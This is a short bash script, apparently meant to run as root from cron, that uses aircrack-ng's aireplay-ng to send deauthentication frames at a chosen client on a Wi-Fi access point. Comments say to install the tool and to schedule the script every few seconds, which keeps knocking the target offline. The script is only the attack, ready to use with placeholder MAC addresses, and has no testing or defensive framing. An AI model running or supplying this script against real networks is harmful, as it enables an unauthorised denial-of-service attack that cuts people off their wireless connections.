#! /bin/bash

HOME=/root
LOGNAME=root
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/root

#install aircarak-ng
#add the script to crontab every 5 secs

aireplay-ng -0 1 -a <Access-Point-MAC> -c <Target-MAC> wlan0

